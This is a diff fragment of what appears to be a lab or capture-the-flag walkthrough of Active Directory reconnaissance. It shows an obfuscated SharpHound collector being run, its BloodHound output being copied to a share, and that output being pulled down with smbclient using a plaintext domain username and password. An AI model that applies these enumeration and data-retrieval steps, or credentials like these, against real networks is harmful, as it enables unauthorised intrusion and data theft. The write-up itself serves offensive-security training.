@@ -589,5 +589,28 @@ PS C:\temp> .\sharphound-obf.exe -c All
 This executed it
 
 ```python
-
+PS C:\temp> cp 20260501124938_BloodHound.zip C:\Shares
+cp 20260501124938_BloodHound.zip C:\Shares
+PS C:\temp>
 ```
+This made the output accessible over SMB so i can download it
+
+```python
+smbclient //dc.novacart.local/Shares -U 'j.bronski'%'jan162005'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  Dn        0  Fri May  1 20:49:54 2026
+  ..                                 Dn        0  Fri May  1 20:49:54 2026
+  20260501124938_BloodHound.zip      An    14725  Fri May  1 20:49:39 2026
+  Backup                             Dn        0  Wed Dec 31 20:28:53 2025
+  CREDHIST                         AHSn       24  Tue Dec 23 10:35:20 2025
+  IT_Tickets                         Dn        0  Wed Apr 15 19:52:38 2026
+  Tools                              Dn        0  Sat Feb 21 18:14:43 2026
+
+		12966143 blocks of size 4096. 6281055 blocks available
+smb: \> get 20260501124938_BloodHound.zip
+getting file \20260501124938_BloodHound.zip of size 14725 as 20260501124938_BloodHound.zip (36.4 KiloBytes/sec) (average 36.4 KiloBytes/sec)
+smb: \> 
+```
+Now ill re-ingest the data!
+
